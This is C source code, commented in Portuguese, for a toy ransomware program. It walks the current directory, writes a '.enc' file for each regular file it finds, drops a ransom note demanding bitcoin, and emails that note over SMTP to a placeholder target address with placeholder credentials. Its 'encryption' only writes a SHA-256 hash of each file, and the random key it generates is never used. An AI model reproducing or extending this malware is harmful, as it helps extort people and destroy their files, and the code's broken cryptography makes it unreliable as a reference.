#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/sha.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/buffer.h>
#include <curl/curl.h>
#include <dirent.h>
#include <sys/types.h>
#include <unistd.h>

#define SMTP_SERVER "smtp://smtp.protonmail.com:443"
#define SENDER_EMAIL "seu-email@proton.me"
#define SENDER_PASSWORD "sua senha"
#define RECEIVER_EMAIL "email-do-alvo hehe"

void criptografar_arquivo(const char *path, const unsigned char *key){
    FILE *file = fopen(path, "rb");
    if(!file){
        perror("Erro ao abrir arquivo");
	return;
    }

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *data = (unsigned char *)malloc(size);
    fread(data, 1, size, file);
    fclose(file);

    unsigned char criptografado[SHA256_DIGEST_LENGTH];
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();

    EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL);
    EVP_DigestUpdate(mdctx, data, size);
    EVP_DigestFinal_ex(mdctx, criptografado, NULL);


    char new_path[256];
    snprintf(new_path, sizeof(new_path), "%s.enc", path);
    file = fopen(new_path, "wb");
    fwrite(criptografado, 1, SHA256_DIGEST_LENGTH, file);
    fclose(file);
    free(data);
    EVP_MD_CTX_free(mdctx);
}

char *base64_encode(const unsigned char *input, int length){
    BIO *bmem, *b64;
    BUF_MEM *bptr;

    b64 = BIO_new(BIO_f_base64());
    bmem = BIO_new(BIO_s_mem());
    BIO_push(b64, bmem);
    BIO_write(b64, input, length);
    BIO_flush(b64);
    BIO_get_mem_ptr(b64, &bptr);

    char *buff = (char *)malloc(bptr->length + 1);
    memcpy(buff, bptr->data, bptr->length);
    buff[bptr->length] = 0;

    BIO_free_all(b64);

    return buff;

}

size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp){
    const char **upload = (const char **)userp;
    if(size * nmemb < 1 || !*upload){
        return 0;	    
    }

    size_t len = strlen(*upload);
    memcpy(ptr, *upload, len);
    *upload += len;
    return len;
}

void enviar_email(const char *mensagem){
    CURL *curl;
    CURLcode res;
    struct curl_slist *recipients = NULL;

    curl = curl_easy_init();
    if(curl){
        curl_easy_setopt(curl, CURLOPT_USERNAME, SENDER_EMAIL);
	curl_easy_setopt(curl, CURLOPT_PASSWORD, SENDER_PASSWORD);
	curl_easy_setopt(curl, CURLOPT_URL, SMTP_SERVER);

	curl_easy_setopt(curl, CURLOPT_MAIL_FROM, SENDER_EMAIL);
	recipients = curl_slist_append(recipients, RECEIVER_EMAIL);
	curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

	curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);

	curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
	curl_easy_setopt(curl, CURLOPT_READDATA, &mensagem);
	curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

	res = curl_easy_perform(curl);

	if(res != CURLE_OK){
	    fprintf(stderr, "Erro ao enviar e-mail: %s\n", curl_easy_strerror(res));
	}

	curl_slist_free_all(recipients);
	curl_easy_cleanup(curl);
    
    }
}

int main(){
    unsigned char key[32];
    RAND_bytes(key, sizeof(key));
    char *key_base64 = base64_encode(key, sizeof(key));

    const char *pasta = ".";

    struct dirent *entry;
    DIR *dp = opendir(pasta);

    if(dp == NULL){
        perror("Erro ao abrir diretório");
	return 1;
    }

    while((entry = readdir(dp))){
        if(entry->d_type == DT_REG){
	    char path[256];
	    snprintf(path, sizeof(path), "%s/%s", pasta, entry->d_name);
	    criptografar_arquivo(path, key);
	
	}
    
    }

    closedir(dp);

    FILE *resgate = fopen("ola-gafanhoto.txt", "w");
    fprintf(resgate, "Olá, meu caro, seus arquivos foram criptografado. Quer recupera-los? envie 'algum valor em bitcoin', para esse endereço 'endereço da sua carteira'.\n");
    fclose(resgate);

    FILE *ransomware = fopen("ola-gafanhoto.txt", "rb");
    if(ransomware){
        fseek(ransomware, 0, SEEK_END);
	long tamanho = ftell(ransomware);
	fseek(ransomware, 0, SEEK_SET);

	char *mensagem = (char *)malloc(tamanho + 1);
	fread(mensagem, 1, tamanho, ransomware);
	mensagem[tamanho] = '\0';

	enviar_email(mensagem);

	free(mensagem);
	fclose(ransomware);
    
    }

    free(key_base64);
    return 0;

}





















